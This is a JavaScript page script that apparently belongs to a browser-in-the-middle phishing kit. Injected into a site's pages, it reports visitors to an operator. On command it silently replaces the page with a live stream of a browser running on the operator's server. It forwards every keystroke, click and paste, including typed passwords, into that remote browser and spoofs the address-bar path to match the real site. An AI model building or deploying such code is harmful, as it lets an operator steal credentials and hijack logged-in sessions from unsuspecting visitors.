// Injected on every Domain A page. Two jobs:
//  1) tell the operator we're here and what page we're on (real-time presence)
//  2) if the operator casts to us, swap the page for a live
//     stream of the operator's server-browser and relay our input back into it.
(function () {
  const socket = io();
  window.socket = socket;
  let sessionId = localStorage.getItem('cobrowse_session_id');
  if (!sessionId) {
    sessionId = 'sess-' + Math.random().toString(36).slice(2, 8);
    localStorage.setItem('cobrowse_session_id', sessionId);
  }
  const path = document.body.dataset.path || location.pathname;
  const width = window.innerWidth || document.documentElement.clientWidth;
  const height = window.innerHeight || document.documentElement.clientHeight;
  const isMobile = /Mobi|Android|iPhone|iPad/i.test(navigator.userAgent);

  socket.emit('visitor:hello', { 
    sessionId, 
    url: path,
    deviceInfo: {
      width,
      height,
      isMobile,
      userAgent: navigator.userAgent
    }
  });

  // In a real multi-page site you'd emit visitor:nav on SPA route changes.
  // Here each page is a full load, so hello covers it.

  const stage = document.getElementById('cobrowse-stage');
  let canvas, ctx, casting = false;
  let cropState = null;

  socket.on('cast:start', (data) => {
    casting = true;
    cropState = (data && data.crop) || null;

    if (stage) {
      stage.hidden = false;
      stage.innerHTML = '';
      canvas = document.createElement('canvas');
      canvas.style.width = '100%';
      canvas.style.height = '100%';
      canvas.style.objectFit = 'contain';
      canvas.style.display = 'block';
      canvas.style.cursor = 'default';
      stage.appendChild(canvas);
      ctx = canvas.getContext('2d');
      wireInput(canvas);
    }
  });

  socket.on('cast:stop', () => {
    casting = false;
    cropState = null;
    
    const loadingScreen = document.getElementById('loading-screen');
    if (loadingScreen) loadingScreen.style.display = 'none';
    const header = document.getElementById('visitor-header');
    if (header) header.style.display = '';
    const main = document.getElementById('visitor-main');
    if (main) main.style.display = '';

    if (stage) {
      stage.hidden = true;
      stage.innerHTML = '';
    }
    canvas = null;
    ctx = null;
  });

  socket.on('crop:change', (crop) => {
    cropState = crop;
  });

  socket.on('visitor:show-context-menu', ({ info, clientX, clientY }) => {
    showContextMenu(clientX, clientY, info, socket, false, sessionId);
  });

  socket.on('visitor:redirect', ({ url }) => {
    window.location.href = url;
  });

  socket.on('frame', (data) => {
    if (!casting || !canvas || !ctx) return;
    let b64 = data;
    let url = null;
    if (data && typeof data === 'object') {
      b64 = data.b64;
      url = data.url;
    }
    const img = new Image();
    img.onload = () => {
      if (cropState) {
        canvas.width = img.naturalWidth * cropState.w;
        canvas.height = img.naturalHeight * cropState.h;
        ctx.drawImage(
          img,
          cropState.x * img.naturalWidth,
          cropState.y * img.naturalHeight,
          cropState.w * img.naturalWidth,
          cropState.h * img.naturalHeight,
          0, 0, canvas.width, canvas.height
        );
      } else {
        canvas.width = img.naturalWidth;
        canvas.height = img.naturalHeight;
        ctx.drawImage(img, 0, 0, canvas.width, canvas.height);
      }
      const loadingScreen = document.getElementById('loading-screen');
      if (loadingScreen) loadingScreen.style.display = 'none';
    };
    img.onerror = (err) => {
      console.error('Visitor image failed to load! b64 length:', b64 ? b64.length : 'undefined');
    };
    img.src = 'data:image/jpeg;base64,' + b64;

    if (url) {
      const cleanUrl = url.replace(/^https?:\/\//i, '');
      const expectedPath = '/' + cleanUrl;
      if (window.location.pathname !== expectedPath) {
        window.history.pushState(null, '', expectedPath);
      }
    }
  });

  // Capture clicks / typing / scroll on the streamed image and send them up.
  function wireInput(el) {
    const norm = (e) => {
      const r = el.getBoundingClientRect();
      const aspect = el.width / el.height;
      let scale, dw, dh;
      if (r.width / r.height > aspect) {
        scale = r.height / el.height;
      } else {
        scale = r.width / el.width;
      }
      dw = el.width * scale;
      dh = el.height * scale;
      const ox = r.left + (r.width - dw) / 2, oy = r.top + (r.height - dh) / 2;
      const cx = (e.clientX - ox) / dw;
      const cy = (e.clientY - oy) / dh;
      if (cropState) {
        return {
          nx: cropState.x + cx * cropState.w,
          ny: cropState.y + cy * cropState.h
        };
      } else {
        return { nx: cx, ny: cy };
      }
    };
    el.addEventListener('click', (e) => {
      const { nx, ny } = norm(e);
      if (nx < 0 || nx > 1 || ny < 0 || ny > 1) return;
      socket.emit('visitor:input', { type: 'click', nx, ny });
    });
    el.setAttribute('tabindex', '0');
    el.addEventListener('keydown', (e) => {
      // Handle Ctrl+A
      if ((e.ctrlKey || e.metaKey) && e.key.toLowerCase() === 'a') {
        e.preventDefault();
        socket.emit('visitor:input', { type: 'key', key: 'Control+A' });
        return;
      }
      // Allow native browser shortcuts (like Ctrl+V, Ctrl+C) to pass through to fire paste listener
      if (e.ctrlKey || e.metaKey) {
        return;
      }

      if (['Enter', 'Backspace', 'Delete', 'Tab', 'ArrowLeft', 'ArrowRight', 'ArrowUp', 'ArrowDown'].includes(e.key)) {
        e.preventDefault();
        socket.emit('visitor:input', { type: 'key', key: e.key });
      } else if (e.key.length === 1) {
        e.preventDefault();
        socket.emit('visitor:input', { type: 'text', text: e.key });
      }
    });
    el.addEventListener('paste', (e) => {
      e.preventDefault();
      const text = (e.clipboardData || window.clipboardData).getData('text');
      if (text) {
        socket.emit('visitor:paste', { text });
      }
    });
    el.addEventListener('contextmenu', (e) => {
      e.preventDefault();
      const { nx, ny } = norm(e);
      socket.emit('visitor:check-context', { nx, ny, clientX: e.clientX, clientY: e.clientY });
    });
    el.addEventListener('wheel', (e) => {
      e.preventDefault();
      socket.emit('visitor:input', { type: 'scroll', dy: e.deltaY });
    }, { passive: false });
  }

  function showContextMenu(clientX, clientY, info, socket, isOperator, targetSessionId) {
    const existing = document.getElementById('ctx-menu');
    if (existing) existing.remove();

    const menu = document.createElement('div');
    menu.id = 'ctx-menu';
    menu.className = 'custom-context-menu';
    menu.style.left = clientX + 'px';
    menu.style.top = clientY + 'px';

    const itemCut = document.createElement('div');
    itemCut.className = 'custom-context-menu-item' + (info.hasSelection ? '' : ' disabled');
    itemCut.innerHTML = `<span>Cut</span><span class="custom-context-menu-shortcut">Ctrl+X</span>`;
    if (info.hasSelection) {
      itemCut.onclick = async () => {
        try {
          await navigator.clipboard.writeText(info.selectionText);
          if (isOperator) {
            socket.emit('operator:input', { sessionId: targetSessionId, ev: { type: 'key', key: 'Backspace' } });
          } else {
            socket.emit('visitor:input', { type: 'key', key: 'Backspace' });
          }
        } catch (e) { console.error(e); }
        menu.remove();
      };
    }
    menu.appendChild(itemCut);

    const itemCopy = document.createElement('div');
    itemCopy.className = 'custom-context-menu-item' + (info.hasSelection ? '' : ' disabled');
    itemCopy.innerHTML = `<span>Copy</span><span class="custom-context-menu-shortcut">Ctrl+C</span>`;
    if (info.hasSelection) {
      itemCopy.onclick = async () => {
        try {
          await navigator.clipboard.writeText(info.selectionText);
        } catch (e) { console.error(e); }
        menu.remove();
      };
    }
    menu.appendChild(itemCopy);

    const itemPaste = document.createElement('div');
    itemPaste.className = 'custom-context-menu-item';
    itemPaste.innerHTML = `<span>Paste</span><span class="custom-context-menu-shortcut">Ctrl+V</span>`;
    itemPaste.onclick = async () => {
      try {
        const text = await navigator.clipboard.readText();
        if (text) {
          sendPaste(text);
        } else {
          fallback();
        }
      } catch (e) {
        fallback();
      }
      menu.remove();
    };
    menu.appendChild(itemPaste);

    function fallback() {
      const text = prompt("Paste text here:");
      if (text) sendPaste(text);
    }

    function sendPaste(text) {
      if (isOperator) {
        socket.emit('operator:paste', { sessionId: targetSessionId, text });
      } else {
        socket.emit('visitor:paste', { text });
      }
    }

    const divider = document.createElement('div');
    divider.style.borderTop = '1px solid rgba(255,255,255,0.1)';
    divider.style.margin = '4px 0';
    menu.appendChild(divider);

    const itemSelectAll = document.createElement('div');
    itemSelectAll.className = 'custom-context-menu-item';
    itemSelectAll.innerHTML = `<span>Select All</span><span class="custom-context-menu-shortcut">Ctrl+A</span>`;
    itemSelectAll.onclick = () => {
      if (isOperator) {
        socket.emit('operator:input', { sessionId: targetSessionId, ev: { type: 'key', key: 'Control+A' } });
      } else {
        socket.emit('visitor:input', { type: 'key', key: 'Control+A' });
      }
      menu.remove();
    };
    menu.appendChild(itemSelectAll);

    document.body.appendChild(menu);

    const dismiss = () => {
      menu.remove();
      document.removeEventListener('click', dismiss);
      document.removeEventListener('contextmenu', dismiss);
    };
    setTimeout(() => {
      document.addEventListener('click', dismiss);
      document.addEventListener('contextmenu', dismiss);
    }, 10);
  }
})();
